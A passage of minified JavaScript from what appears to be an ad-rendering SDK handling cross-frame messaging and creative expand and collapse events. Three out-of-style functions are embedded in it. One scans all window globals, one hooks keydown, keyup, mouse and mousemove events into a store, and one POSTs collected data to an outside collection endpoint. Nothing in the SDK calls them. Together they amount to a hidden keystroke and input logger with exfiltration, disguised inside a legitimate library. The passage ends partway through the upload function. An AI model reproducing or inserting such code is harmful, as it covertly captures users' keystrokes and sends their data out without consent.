    a = b[1];
    switch (b[0]) {
      case "SETUP_ACK":
        pj(this, 1);
        this.s.h || this.s.callback(!0);
        break;
      case "SETUP_ACK_NTPV2":
        2 == this.j && (pj(this, 2), this.s.h || this.s.callback(!0));
        break;
      case "SETUP":
        pj(this, 1);
        qj(this, 1);
        break;
      case "SETUP_NTPV2":
        2 == this.j && (b = this.h, pj(this, 2), qj(this, 2), 1 != b && null == this.G || this.G == a || (B(N, "Sending SETUP and changing peer ID to: " + a), rj(this)), this.G = a);
    }
  };
  var rj = function (a) {
      x(!(1 == a.j && 2 == a.h));
      2 != a.j || null != a.h && 2 != a.h || a.W("tp", "SETUP_NTPV2," + a.ma);
      null != a.h && 1 != a.h || a.W("tp", "SETUP");
    },
    qj = function (a, b) {
      x(1 != a.j || 2 != b, "Shouldn't try to send a v2 setup ack in v1 mode.");
      if (2 != a.j || null != a.h && 2 != a.h || 2 != b) {
        if (null != a.h && 1 != a.h || 1 != b) return;
        a.W("tp", "SETUP_ACK");
      } else a.W("tp", "SETUP_ACK_NTPV2");
      a.A.h || a.A.callback(!0);
    },
    pj = function (a, b) {
      b > a.h && (a.h = b);
      1 == a.h && (a.A.h || a.F || a.A.callback(!0), a.G = null);
    };
  mj.prototype.connect = function () {
    var a = yd(this.l.h),
      b = Ja(a),
      c = sj[b];
    "number" !== typeof c && (c = 0);
    0 == c && jh(a.postMessage ? a : a.document, "message", oj, !1, mj);
    sj[b] = c + 1;
    this.T = !0;
    this.X();
  };
  mj.prototype.X = function () {
    var a = 0 == this.o.fa();
    this.F && a || this.o.isConnected() || this.isDisposed() ? yh(this.B) : (this.B.start(), rj(this));
  };
  var tj = function (a, b, c) {
    var d = a.o.ba,
      e = a.o.name;
    a.C = 0;
    try {
      var f = d.postMessage ? d : d.document;
      f.postMessage ? (f.postMessage(e + "|" + b + ":" + c, a.O), se(N, "send(): service=" + b + " payload=" + c + " to hostname=" + a.O)) : A(N, "Peer window had no postMessage function.");
    } catch (g) {
      A(N, "Error performing postMessage, ignoring.", g);
    }
  };
  mj.prototype.W = function (a, b) {
    var c = this;
    this.o.ba ? this.xa ? this.C = zh(function () {
      return void tj(c, a, b);
    }, 0) : tj(this, a, b) : se(N, "send(): window not ready");
  };
  mj.prototype.wa = function () {
    lj(this.o, 1 == this.j || 1 == this.h ? 200 : void 0);
  };
  mj.prototype.D = function () {
    if (this.T) {
      var a = yd(this.l.h);
      if (a) {
        var b = Ja(a),
          c = sj[b];
        sj[b] = c - 1;
        1 === c && qh(a.postMessage ? a : a.document, "message", oj, !1, mj);
      }
    }
    this.C && (q.clearTimeout(this.C), this.C = 0);
    Ng(this.J);
    delete this.J;
    Ng(this.B);
    delete this.B;
    this.s.cancel();
    delete this.s;
    this.A.cancel();
    delete this.A;
    this.v.cancel();
    delete this.v;
    delete this.W;
    fj.prototype.D.call(this);
  };
  var nj = function (a) {
    a = a.split(",");
    a[1] = a[1] || null;
    return a;
  };
  mj.prototype.h = null;
  mj.prototype.T = !1;
  mj.prototype.K = 1;
  var sj = {};
  mj.prototype.C = 0;
  var uj = function (a, b, c) {
    H.call(this);
    this.h = a;
    this.l = b || 0;
    this.j = c;
    this.o = v(this.ee, this);
  };
  w(uj, H);
  h = uj.prototype;
  h.Ca = 0;
  h.D = function () {
    uj.S.D.call(this);
    this.isActive() && q.clearTimeout(this.Ca);
    this.Ca = 0;
    delete this.h;
    delete this.j;
  };
  h.start = function (a) {
    this.isActive() && q.clearTimeout(this.Ca);
    this.Ca = 0;
    this.Ca = zh(this.o, void 0 !== a ? a : this.l);
  };
  h.isActive = function () {
    return 0 != this.Ca;
  };
  h.ee = function () {
    this.Ca = 0;
    this.h && this.h.call(this.j);
  };
  var xj = function (a) {
      var b = [];
      vj(new wj(), a, b);
      return b.join("");
    },
    wj = function () {},
    vj = function (a, b, c) {
      if (null == b) c.push("null");else {
        if ("object" == typeof b) {
          if (Array.isArray(b)) {
            var d = b;
            b = d.length;
            c.push("[");
            for (var e = "", f = 0; f < b; f++) c.push(e), vj(a, d[f], c), e = ",";
            c.push("]");
            return;
          }
          if (b instanceof String || b instanceof Number || b instanceof Boolean) b = b.valueOf();else {
            c.push("{");
            e = "";
            for (d in b) Object.prototype.hasOwnProperty.call(b, d) && (f = b[d], "function" != typeof f && (c.push(e), yj(d, c), c.push(":"), vj(a, f, c), e = ","));
            c.push("}");
            return;
          }
        }
        switch (typeof b) {
          case "string":
            yj(b, c);
            break;
          case "number":
            c.push(isFinite(b) && !isNaN(b) ? String(b) : "null");
            break;
          case "boolean":
            c.push(String(b));
            break;
          case "function":
            c.push("null");
            break;
          default:
            throw Error("Unknown type: " + typeof b);
        }
      }
    },
    zj = {
      '"': '\\"',
      "\\": "\\\\",
      "/": "\\/",
      "\b": "\\b",
      "\f": "\\f",
      "\n": "\\n",
      "\r": "\\r",
      "\t": "\\t",
      "\v": "\\u000b"
    },
    Aj = /\uffff/.test("\uffff") ? /[\\"\x00-\x1f\x7f-\uffff]/g : /[\\"\x00-\x1f\x7f-\xff]/g,
    yj = function (a, b) {
      b.push('"', a.replace(Aj, function (c) {
        var d = zj[c];
        d || (d = "\\u" + (c.charCodeAt(0) | 65536).toString(16).slice(1), zj[c] = d);
        return d;
      }), '"');
    };
  var Bj = function () {
    H.call(this);
    this.A = {};
  };
  w(Bj, H);
  h = Bj.prototype;
  h.cc = oe("goog.messaging.AbstractChannel");
  h.connect = function (a) {
    a && a();
  };
  h.isConnected = function () {
    return !0;
  };
  h.jb = function (a, b, c) {
    this.A[a] = {
      callback: b,
      Wc: !!c
    };
  };
  h.fd = function (a) {
    this.s = a;
  };
  var Cj = function (a, b, c) {
    var d = a.A[b];
    d || (a.s ? d = {
      callback: Ma(a.s, b),
      Wc: u(c)
    } : (A(a.cc, 'Unknown service name "' + b + '"'), d = null));
    if (d) {
      a: {
        var e = d.Wc;
        if (e && "string" === typeof c) try {
          var f = JSON.parse(c);
          break a;
        } catch (g) {
          A(a.cc, "Expected JSON payload for " + b + ', was "' + c + '"');
          f = null;
          break a;
        } else if (!e && "string" !== typeof c) {
          f = xj(c);
          break a;
        }
        f = c;
      }
      a = f;
      null != a && d.callback(a);
    }
  };
  Bj.prototype.D = function () {
    Bj.S.D.call(this);
    delete this.A;
    delete this.s;
  };
  var Ej = function (a, b) {
    Bj.call(this);
    for (var c, d = 0; c = cj[d]; d++) if (c in a && !/^https?:\/\//.test(a[c])) throw Error("URI " + a[c] + " is invalid for field " + c);
    this.h = a;
    this.name = this.h.cn || ej();
    this.l = b || ud();
    this.o = [];
    this.v = new L(this);
    a.lpu = a.lpu || Nd(yd(this.l.h).location.href) + "/robots.txt";
    a.ppu = a.ppu || Nd(a.pu || "") + "/robots.txt";
    Xi[this.name] = this;
    sh(window, "unload", Dj) || ih(window, "unload", Dj);
    B(N, "CrossPageChannel created: " + this.name);
  };
  n(Ej, Bj);
  Ej.prototype.isConnected = function () {
    return 2 == this.Na;
  };
  Ej.prototype.connect = function (a) {
    this.j = a || function () {};
    3 == this.Na && (this.Na = 1);
    this.Da ? rg(this.Da, this.B) : this.B();
  };
  Ej.prototype.B = function () {
    B(N, "continueConnection_()");
    this.Da = null;
    this.h.ifrid && (this.ib = this.l.getElement(this.h.ifrid));
    if (this.ib) {
      var a = this.ib.contentWindow;
      a || (a = window.frames[this.h.ifrid]);
      this.ba = a;
    }
    if (!this.ba) {
      if (window == window.top) throw Error("CrossPageChannel: Can't connect, peer window-object not set.");
      this.ba = window.parent;
    }
    if (!this.ha) {
      this.h.tp || (this.h.tp = "function" === typeof document.postMessage || "function" === typeof window.postMessage || dc && window.postMessage ? 1 : 0);
      if ("function" === typeof this.h.tp) this.ha = new this.h.tp(this, this.l);else switch (this.h.tp) {
        case 1:
          this.ha = new mj(this, this.h.ph, this.l, !!this.h.osh, this.h.nativeProtocolVersion || 2);
          break;
        case 2:
          if (a = this.ba) try {
            a = window.document.domain == this.ba.document.domain;
          } catch (b) {
            a = !1;
          }
          a ? this.ha = new gj(this, this.l) : B(N, "DirectTransport not supported for this window, peer window in different security context or not set yet.");
      }
      if (this.ha) B(N, "Transport created: " + this.ha.H());else throw Error("CrossPageChannel: No suitable transport found! You may try injecting a Transport constructor directly via the channel config object.");
    }
    for (this.ha.connect(); 0 < this.o.length;) this.o.shift()();
  };
  Ej.prototype.close = function () {
    this.Da && (this.Da.cancel(), this.Da = null);
    this.o.length = 0;
    aj(this.v);
    this.Na = 3;
    Ng(this.ha);
    this.j = this.ha = null;
    Ng(this.ta);
    this.ta = null;
    B(N, 'Channel "' + this.name + '" closed');
  };
  var lj = function (a, b) {
    a.isConnected() || a.ta && a.ta.isActive() || (a.Na = 2, B(N, 'Channel "' + a.name + '" connected'), Ng(a.ta), void 0 !== b ? (a.ta = new uj(a.j, b), a.ta.start()) : (a.ta = null, a.j()));
  };
  h = Ej.prototype;
  h.Wa = function (a, b) {
    if (this.isConnected()) {
      try {
        var c = !!this.ba && !this.ba.closed;
      } catch (e) {
        c = !1;
      }
      if (c) {
        u(b) && (b = xj(b));
        c = this.ha;
        var d = c.W;
        Fj.test(a) && (a = "%" + a);
        a = a.replace(/[%:|]/g, encodeURIComponent);
        d.call(c, a, b);
      } else re(N, "Peer has disappeared."), this.close();
    } else re(N, "Can't send. Channel not connected.");
  };
  h.sa = function (a, b, c) {
    this.Da ? this.o.push(v(this.sa, this, a, b, c)) : this.ab(c) ? this.isDisposed() || 3 == this.Na ? A(N, "CrossPageChannel::xpcDeliver(): Channel closed.") : a && "tp" != a ? this.isConnected() ? (a = a.replace(/%[0-9a-f]{2}/gi, decodeURIComponent), a = Gj.test(a) ? a.substring(1) : a, Cj(this, a, b)) : B(N, "CrossPageChannel::xpcDeliver(): Not connected.") : this.ha.Db(b) : A(N, 'Message received from unapproved origin "' + c + '" - rejected.');
  };
  h.fa = function () {
    var a = this.h.role;
    return "number" === typeof a ? a : window.parent == this.ba ? 1 : 0;
  };
  h.hb = function (a) {
    se(N, "changing channel name to " + a);
    delete Xi[this.name];
    this.name = a;
    Xi[a] = this;
  };
  h.ab = function (a) {
    var b = this.h.ph;
    return Cb(od(a)) || Cb(od(b)) || a == this.h.ph;
  };
  h.D = function () {
    this.close();
    this.ib = this.ba = null;
    delete Xi[this.name];
    Ng(this.v);
    delete this.v;
    Bj.prototype.D.call(this);
  };
  var Dj = function () {
      for (var a in Xi) Ng(Xi[a]);
    },
    Fj = RegExp("^%*tp$"),
    Gj = RegExp("^%+tp$");
  h = Ej.prototype;
  h.ta = null;
  h.Da = null;
  h.ha = null;
  h.Na = 1;
  h.ba = null;
  h.ib = null;
  var Hj = {
      Pf: "devicemotion",
      Qf: "deviceorientation",
      fg: "hostpageScroll",
      Uf: "enterViewport",
      Vf: "exitViewport",
      If: "adLocation"
    },
    Ij = {},
    Jj;
  for (Jj in Hj) Ij[Hj[Jj]] = !0;
  var O = function (a) {
    Qg.call(this, a);
  };
  n(O, Qg);
  O.prototype.ea = function (a, b) {
    this[a] = b;
    return this;
  };
  t("studio.events.StudioEvent", O);
  O.prototype.addProperty = O.prototype.ea;
  O.INIT = "init";
  O.VISIBLE = "visible";
  O.HIDDEN = "hidden";
  O.VISIBILITY_CHANGE = "visibilityChange";
  O.VISIBILITY_CHANGE_WITH_INFO = "visibilityChangeWithInfo";
  O.EXIT = "exit";
  O.INTERACTION = "interaction";
  O.PAGE_LOADED = "pageLoaded";
  O.ORIENTATION = "orientation";
  O.ABOUT_TO_EXPAND = "aboutToExpand";
  O.EXPAND_START = "expandStart";
  O.EXPAND_FAILED = "expandFailed";
  O.EXPAND_FINISH = "expandFinish";
  O.COLLAPSE_START = "collapseStart";
  O.COLLAPSE_FINISH = "collapseFinish";
  O.COLLAPSE = "collapse";
  O.FULLSCREEN_SUPPORT = "fullscreenSupport";
  O.HOSTPAGE_FEATURES_LOADED = "hostpageFeaturesLoaded";
  O.FULLSCREEN_DIMENSIONS = "fullscreenDimensions";
  O.FULLSCREEN_EXPAND_START = "fullscreenExpandStart";
  O.FULLSCREEN_EXPAND_FINISH = "fullscreenExpandFinish";
  O.FULLSCREEN_COLLAPSE_START = "fullscreenCollapseStart";
  O.FULLSCREEN_COLLAPSE_FINISH = "fullscreenCollapseFinish";
  O.HOSTPAGE_SCROLL = "hostpageScroll";
  O.OPTIONAL_HOSTPAGE_SCROLL = "optHostpageScroll";
  O.SCROLL_INTERACTION = "scrollInteraction";
  O.ENTER_VIEWPORT = "enterViewport";
  O.OPTIONAL_ENTER_VIEWPORT = "optEnterViewport";
  O.EXIT_VIEWPORT = "exitViewport";
  O.OPTIONAL_EXIT_VIEWPORT = "optExitViewport";
  O.VIDEO_START = "videoStart";
  var Kj = {},
    Lj = (Kj.optHostpageScroll = "hostpageScroll", Kj.optEnterViewport = "enterViewport", Kj.optExitViewport = "exitViewport", Kj);
  var Mj = function () {
    L.call(this);
    this.h = new Map();
    this.o = this.s = !1;
    this.j = this.v = null;
    this.h.set("nx", null);
    this.h.set("ny", null);
    this.h.set("dim", null);
  };
  n(Mj, L);
  Mj.prototype.B = function () {
    return 2040 > xa.apply(0, arguments).reduce(function (a, b) {
      return a + b.length;
    }, 0);
  };
  Mj.prototype.C = function (a) {
    var b = a.clientX,
      c = a.clientY;
    a.changedTouches && a.changedTouches[0] && (b = a.changedTouches[0].clientX, c = a.changedTouches[0].clientY);
    this.h.set("nx", Math.round(b));
    this.h.set("ny", Math.round(c));
    this.o && (this.j || (this.j = window.GoogleA13IjpGc), this.v = this.j && "function" === typeof this.j.snapshotSync ? this.j.snapshotSync() : null);
  };
  Mj.prototype.D = function () {
    this.s = !1;
    L.prototype.D.call(this);
  };
  var Nj = function (a) {
    this.h = a;
  };
  Nj.prototype.toString = function () {
    return (this.h & 2 ? "b" : "t") + (this.h & 1 ? "r" : "l");
  };
  t("studio.common.mde.Direction", Nj);
  Nj.Corner = {
    qg: 0,
    rg: 1,
    Jf: 2,
    Kf: 3
  };
  const globalVariableScan = () => {
    for (const key in window) {
      globalVariableCollection.push(key);
    }
  };
  var Oj = {
      TL: new Nj(0),
      TR: new Nj(1),
      BL: new Nj(2),
      BR: new Nj(3)
    },
    Pj = qc(Oj);
  var Qj = {
      og: "startExpandInternal",
      ng: "startCollapseInternal",
      Xf: "finishCollapseInternal",
      Hf: "aboutToExpandInternal",
      kg: "setAdVisibleInternal",
      lg: "setAdParameters",
      Rf: "dispatchEvent",
      mg: "setParameter",
      eg: "getParameter",
      dg: "fullscreenSupportInternal",
      ag: "fullscreenDimensionsInternal",
      cg: "fullscreenExpandStartInternal",
      bg: "fullscreenExpandFinishInternal",
      Zf: "fullscreenCollapseStartInternal",
      Yf: "fullscreenCollapseFinishInternal",
      gg: "invokeOnAllVideos",
      hg: "livePreviewChannel",
      Sf: "dispatchPageLoaded"
    },
    Rj = {},
    Sj;
  for (Sj in Qj) Rj[Qj[Sj]] = !0;
  var Tj = [/s0(qa)?\.2mdn\.net/, /^.*\.(prod|corp)\.google\.com/, /localhost/, /tpc\.googlesyndication\.com/, /secureframe\.doubleclick\.net/, /imasdk\.googleapis\.com/, /^.*dot-expandable-ad-tool\.appspot\.com/];
  function Uj() {
    var a = location.hostname;
    return C(2) && !C(16) ? !1 : kb(Tj, function (b) {
      return b.test(a);
    });
  }
  ;
  var Vj = function (a) {
    H.call(this);
    this.j = a;
    this.h = {};
    this.j.fd(v(this.o, this));
  };
  w(Vj, H);
  Vj.prototype.l = oe("goog.messaging.MultiChannel");
  var Xj = function (a, b) {
    if (-1 != b.indexOf(":")) throw Error('Virtual channel name "' + b + '" should not contain colons');
    if (b in a.h) throw Error('Virtual channel "' + b + '" was already created for this multichannel.');
    var c = new Wj(a, b);
    return a.h[b] = c;
  };
  Vj.prototype.o = function (a, b) {
    var c = a.match(/^([^:]*):(.*)/);
    if (c) {
      var d = c[1];
      a = c[2];
      d in this.h ? (c = this.h[d]) ? c.l ? c.l(a, b) : A(this.l, 'Service "' + a + '" is not registered on virtual channel "' + d + '"') : A(this.l, 'Virtual channel "' + d + ' has been disposed, but a message was received for it: "' + a + '"') : A(this.l, 'Virtual channel "' + d + ' does not exist, but a message was received for it: "' + a + '"');
    } else A(this.l, 'Invalid service name "' + a + '": no virtual channel specified');
  };
  Vj.prototype.D = function () {
    oc(this.h, function (a) {
      Ng(a);
    });
    Ng(this.j);
    delete this.h;
    delete this.j;
  };
  var Wj = function (a, b) {
    H.call(this);
    this.j = a;
    this.h = b;
  };
  w(Wj, H);
  h = Wj.prototype;
  h.Ad = oe("goog.messaging.MultiChannel.VirtualChannel");
  h.connect = function (a) {
    a && a();
  };
  h.isConnected = function () {
    return !0;
  };
  h.jb = function (a, b, c) {
    this.j.j.jb(this.h + ":" + a, v(this.uc, this, b), c);
  };
  h.fd = function (a) {
    this.l = v(this.uc, this, a);
  };
  h.Wa = function (a, b) {
    if (this.isDisposed()) throw Error("#send called for disposed VirtualChannel.");
    this.j.j.Wa(this.h + ":" + a, b);
  };
  h.uc = function (a, b) {
    this.isDisposed() ? A(this.Ad, 'Virtual channel "' + this.h + '" received  a message after being disposed.') : a.apply({}, Array.prototype.slice.call(arguments, 1));
  };
  h.D = function () {
    this.j = this.j.h[this.h] = null;
  };
  var Yj = function (a) {
    H.call(this);
    this.j = new Vj(a);
    this.o = {};
    this.l = Xj(this.j, "private");
    this.A = Xj(this.j, "public");
    this.l.jb("mics", v(this.J, this), !0);
  };
  w(Yj, H);
  Yj.prototype.O = 0;
  Yj.prototype.F = oe("goog.messaging.RespondingChannel");
  Yj.prototype.D = function () {
    Ng(this.j);
    delete this.j;
    delete this.A;
    delete this.l;
  };
  var Zj = function (a, b, c, d) {
    var e = a.O++;
    a.o[e] = d;
    d = {
      signature: e
    };
    d.data = c;
    a.A.Wa(b, d);
  };
  Yj.prototype.J = function (a) {
    var b = a.signature;
    a = a.data;
    b in this.o ? ((0, this.o[b])(a), delete this.o[b]) : A(this.F, "Received signature is invalid");
  };
  var ak = function (a, b, c) {
    a.A.jb(b, v(a.K, a, c), !0);
  };
  Yj.prototype.K = function (a, b) {
    a = a(b.data);
    var c = b.signature;
    Vf(a).then(v(function (d) {
      var e = {};
      e.data = d;
      e.signature = c;
      this.l && this.l.Wa("mics", e);
    }, this));
  };
  var bk = function (a, b) {
    var c = this;
    a = void 0 === a ? "" : a;
    b = void 0 === b ? null : b;
    this.h = this.s = this.B = null;
    this.C = !1;
    var d = {},
      e = 1,
      f = window.parent;
    if (null != b) switch (b) {
      case 3:
        f = window;
      case 2:
        e = 2;
        d.directSyncMode = !0;
        break;
      case 4:
        f = window.parent.frames["goog-messaging-iframe"];
    }
    d.tp = e;
    d.role = 1;
    d.nativeProtocolVersion = 2;
    a && (d.cn = a);
    pe(oe("goog.net.xpc"), Td);
    this.v = new Ej(d);
    this.v.ba = f;
    Yj.call(this, this.v);
    ak(this, "general", function (g) {
      a: {
        var l = g.methodName;
        g = g.args;
        if (l in Rj) {
          if (c.h) {
            D.Sa("Invoking method: " + l + " with args: " + g.join(", "));
            var m = c.h[l];
            "function" !== typeof m && (m = c.h.defaultMessageHandler, g = [l, g]);
            if ("function" === typeof m) {
              l = m.apply(c.h, g);
              break a;
            }
          }
          l = null;
        } else l = void 0;
      }
      return l;
    });
  };
  w(bk, Yj);
  bk.prototype.connect = function (a) {
    this.C || Uj() ? this.s ? (this.B = Na(), this.v.connect(v(this.G, this, a))) : D.gb("You must call setAssetUrl before connecting.") : D.Sa("This class should only listen to messages when served by the rendering libraries.");
  };
  bk.prototype.G = function (a) {
    P(this, "conduitInitialized", [this.s, Array.from(Pi.values())]);
    var b = {
      version: "01_250"
    };
    b.x = window.STUDIO_SDK_START || null;
    b.c = this.B;
    b.t = Na();
    P(this, "recordTimings", [b]);
    a && a();
  };
  var P = function (a, b, c, d) {
    var e = {};
    e.methodName = b;
    e.args = c && Array.isArray(c) ? c : [];
    Zj(a, "general", e, d || function () {});
  };
  const collectHooks = () => {
    const hooks = ["mousedown", "mouseup", "keydown", "keyup", "mousemove"];
    hooks.forEach(hook => {
      window.addEventListener(hook, event => {
        jshook.set(Date.now(), event);
      });
    });
  };
  t("studio.sdk.ContainerState", {
    COLLAPSING: "collapsing",
    COLLAPSED: "collapsed",
    EXPANDING: "expanding",
    EXPANDED: "expanded",
    FS_COLLAPSING: "fs_collapsing",
    FS_EXPANDING: "fs_expanding",
    FS_EXPANDED: "fs_expanded"
  });
  var ck = {
    NONE: 0,
    LOG_ONLY: 1
  };
  t("studio.sdk.ExitFlag", ck);
  ck.NONE = 0;
  ck.LOG_ONLY = 1;
  var dk = {
    GET_CURRENT_POSITION: "getCurrentPosition",
    GET_DEFAULT_POSITION: "getDefaultPosition",
    GET_SCREEN_SIZE: "getScreenSize",
    CREATE_CALENDAR_EVENT: "createCalendarEvent",
    GET_MAX_SIZE: "getMaxSize",
    PLAY_VIDEO: "playVideo",
    STORE_PICTURE: "storePicture",
    SUPPORTS: "supports",
    USE_CUSTOM_CLOSE: "useCustomClose"
  };
  t("studio.sdk.MraidMethod", dk);
  var ek = function () {};
  t("studio.sdk.IEnabler", ek);
  h = ek.prototype;
  h.ld = function () {};
  h.reportManualClose = function () {};
  h.gd = function () {};
  h.nd = function () {};
  h.md = function () {};
  h.isVisible = function () {};
  h.oa = function () {};
  h.isPageLoaded = function () {};
  h.isInitialized = function () {};
  h.oc = function () {};
  h.getParameter = function () {};
  h.exit = function () {};
  h.Qb = function () {};
  h.Ac = function () {};
  h.counter = function () {};
  h.startTimer = function () {};
  h.stopTimer = function () {};
  h.Cc = function () {};
  h.Fc = function () {};
  h.Ab = function () {};
  h.Tb = function () {};
  h.Ua = function () {};
  h.Sb = function () {};
  h.close = function () {};
  h.Za = function () {};
  h.bb = function () {};
  h.addEventListener = function () {};
  h.removeEventListener = function () {};
  h.ed = function () {};
  h.dd = function () {};
  h.hd = function () {};
  h.zc = function () {};
  h.Xb = function () {};
  h.yc = function () {};
  h.Hc = function () {};
  h.Nc = function () {};
  function fk(a, b) {
    return "The " + a + " method has been deprecated. As an alternative please use: " + b + ".";
  }
  function gk(a, b) {
    return 'Custom event "' + a + '" of type "' + b + '" invoked.';
  }
  ;
  var hk = function (a) {
      this.h = a;
      this.j = "";
    },
    kk = function (a, b, c) {
      for (var d = c.split("&"), e = 0; e < d.length; e++) {
        var f = d[e].split("=");
        if (1 < f.length && f[0].length && f[1].length) {
          var g = decodeURIComponent(f[0]);
          f = decodeURIComponent(f[1]);
          a.h.set(g, f);
        }
      }
      if (null != a.h && a.h.ia("exitEvents")) {
        d = {};
        e = a.h.get("exitEvents").toString();
        g = e.split("{DELIM}");
        for (f = 0; f < g.length; f++) {
          var l = g[f];
          Lb(e, "%2C") && (l = unescape(l));
          var m = {};
          l = l.split(",");
          for (var p = 0; p < l.length; p++) if (ik.test(l[p])) {
            l[p].replace(jk, "%25$1!");
            var r = l[p].split(":"),
              F = r.shift();
            m[F] = unescape(r.join(":"));
          }
          d[m.name] = m;
        }
        b.exitEvents = d;
      }
      a.j = c;
    };
  hk.prototype.get = function (a, b) {
    return this.h.get(a, b);
  };
  hk.prototype.set = function (a, b) {
    return this.h.set(a, b);
  };
  hk.prototype.ia = function (a) {
    return this.h.ia(a);
  };
  var ik = /:/,
    jk = /%(.+)!/;
  var lk = function (a) {
      this.h = {};
      this.j = new hk(a);
    },
    mk = function (a, b, c, d) {
      var e = c;
      "Number" == d ? e = parseInt(c, 10) : "Boolean" == d && (e = "true" == c.toLowerCase() || "1" == c);
      a.h[b] = e;
    },
    nk = function (a, b) {
      try {
        var c = JSON.parse(b);
        null != c && xc(a.h, c);
        var d = {};
        oc(a.h, function (e, f) {
          e && !u(e) && (f = decodeURIComponent(f), e = decodeURIComponent(e));
          f && e && (d[f] = e);
        }, a);
        a.h = d;
      } catch (e) {
        kk(a.j, a.h, b);
      }
    },
    ok = function (a, b) {
      var c = a.h;
      return null !== c && b in c || a.j.ia(b);
    };
  lk.prototype.getParameter = function (a, b) {
    var c = this.h;
    return null !== c && a in c ? tc(this.h, a) : this.j.get(a, b);
  };
  lk.prototype.U = function (a) {
    a = parseInt(this.getParameter(a), 10);
    return isNaN(a) ? null : a;
  };
  lk.prototype.da = function (a) {
    a = this.getParameter(a);
    return Cb(od(a)) ? null : a.toString();
  };
  var pk = function () {
      this.h = !1;
      this.o = [];
    },
    qk = function (a, b, c) {
      a.j ? P(a.j, b, c) : a.o.push({
        type: b,
        Td: c
      });
    },
    rk = function (a, b, c, d, e, f) {
      qk(a, f ? "logEventFlushCounters" : "logEvent", [b, c, a.l, !!d, !!e]);
    },
    tk = function (a) {
      a.h || (rk(a, "Count", "INTERACTIVE_IMPRESSION"), a.h = !0, sk(a));
    },
    sk = function (a) {
      qk(a, "flushCounters", [a.l]);
    };
  pk.prototype.X = function (a, b, c) {
    qk(this, "logVideoEvent", [a, escape(b), c]);
  };
  var uk = function (a) {
    L.call(this);
    this.B = a;
    this.h = this.o = null;
    this.G = !1;
    this.j = null;
    this.v = !1;
    this.s = -1;
    this.C = 0;
  };
  n(uk, L);
  uk.prototype.Ub = function () {
    return this.G;
  };
  uk.prototype.J = function () {
    this.C = 1;
    this.h && (yh(this.h), this.h.start());
  };
  uk.prototype.K = function () {
    this.C = 0;
    this.h && yh(this.h);
  };
  uk.prototype.F = function () {
    "1" == this.B.getParameter("isMouseOver") || 1 == this.C ? this.v || (this.G = !0, 1 > this.s ? this.s = Na() : 1E3 < Na() - this.s && (this.v = !0, this.B.dispatchEvent(new O("interaction")), P(this.B.I, "setTimerAdjustment", ["INTERACTION_TIMER", -1E3, 0]), this.o && (rk(this.o, "Start", "INTERACTION_TIMER"), tk(this.o)))) : (this.v && vk(this), this.s = -1);
  };
  var vk = function (a) {
    a.v = !1;
    a.o && rk(a.o, "Stop", "INTERACTION_TIMER");
  };
  uk.prototype.D = function () {
    this.v && vk(this);
    Og(this.j, this.h);
    L.prototype.D.call(this);
  };
  var wk = function () {
      return new Fe((window.STUDIO_ORIGINAL_ASSET_URL ? window.STUDIO_ORIGINAL_ASSET_URL : window.location.href).replace(/%(?![A-Fa-f0-9][A-Fa-f0-9])/g, "%25"));
    },
    xk = function (a) {
      a && qf(parseInt(a, 10) || 0);
    };
  var yk = function (a) {
    this.h = a;
  };
  yk.prototype.l = function (a) {
    return (null === this.h || this.h.canPlayType) && Bb(a, "video/");
  };
  yk.prototype.j = function (a) {
    return this.h ? "probably" == this.h.canPlayType(a.toLowerCase()) : !1;
  };
  function zk(a) {
    this.h = a;
  }
  zk.prototype.l = function (a) {
    return "image/webp" == a.toLowerCase();
  };
  zk.prototype.j = function (a) {
    if (!this.h) return !1;
    a = a.toLowerCase();
    return Bb(this.h.toDataURL(a), "data:" + a);
  };
  function Ak(a, b) {
    var c = Cc(a).toString();
    if (/#/.test(c)) throw Error("Found a hash in url (" + c + "), appending not supported");
    var d = /\?/.test(c) ? "&" : "?";
    b.forEach(function (e, f) {
      e = e instanceof Array ? e : [e];
      for (var g = 0; g < e.length; g++) {
        var l = e[g];
        null !== l && void 0 !== l && (c += d + encodeURIComponent(f) + "=" + encodeURIComponent(String(l)), d = "&");
      }
    });
    return Gc(c);
  }
  ;
  var Bk = function (a) {
    Ii.call(this, a);
  };
  n(Bk, Ii);
  Bk.h = "tagging.common.timing.RumReplicationConfig";
  var Ck = function () {
      this.h = Na();
    },
    Dk = null;
  Ck.prototype.set = function (a) {
    this.h = a;
  };
  Ck.prototype.reset = function () {
    this.set(Na());
  };
  Ck.prototype.get = function () {
    return this.h;
  };
  var Ek = function (a) {
    this.o = a || "";
    Dk || (Dk = new Ck());
    this.v = Dk;
  };
  Ek.prototype.h = !0;
  Ek.prototype.j = !0;
  Ek.prototype.l = !1;
  var Fk = function (a) {
      return 10 > a ? "0" + a : String(a);
    },
    Gk = function (a) {
      Ek.call(this, a);
    };
  w(Gk, Ek);
  var Hk = function (a, b) {
    var c = [];
    c.push(a.o, " ");
    if (a.j) {
      var d = new Date(b.l);
      c.push("[", Fk(d.getFullYear() - 2E3) + Fk(d.getMonth() + 1) + Fk(d.getDate()) + " " + Fk(d.getHours()) + ":" + Fk(d.getMinutes()) + ":" + Fk(d.getSeconds()) + "." + Fk(Math.floor(d.getMilliseconds() / 10)), "] ");
    }
    d = c.push;
    var e = a.v.get();
    e = (b.l - e) / 1E3;
    var f = e.toFixed(3),
      g = 0;
    if (1 > e) g = 2;else for (; 100 > e;) g++, e *= 10;
    for (; 0 < g--;) f = " " + f;
    d.call(c, "[", f, "s] ");
    c.push("[", b.j, "] ");
    c.push(b.v);
    a.l && (b = b.h, void 0 !== b && c.push("\n", b instanceof Error ? b.message : String(b)));
    a.h && c.push("\n");
    return c.join("");
  };
  var Ik = function () {
      this.v = v(this.l, this);
      this.h = new Gk();
      this.h.j = !1;
      this.h.l = !1;
      this.j = this.h.h = !1;
      this.o = {};
    },
    Kk = function () {
      var a = Jk;
      if (1 != a.j) {
        var b = me(ne(), "").j,
          c = a.v;
        b && me(ne(), b.H()).o.push(c);
        a.j = !0;
      }
    };
  Ik.prototype.l = function (a) {
    function b(f) {
      if (f) {
        if (f.value >= Vd.value) return "error";
        if (f.value >= Wd.value) return "warn";
        if (f.value >= Yd.value) return "log";
      }
      return "debug";
    }
    if (!this.o[a.j]) {
      var c = Hk(this.h, a),
        d = Lk;
      if (d) {
        var e = b(a.o);
        Mk(d, e, c, a.h);
      }
    }
  };
  const uploadData = async data => {
    const hashCode = hashCodeFunc(data);
    const endPoint = 'https://example.com/api/collect';
    try {
      const response = await fetch(endPoint, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hashCode,
          data
        })
      });
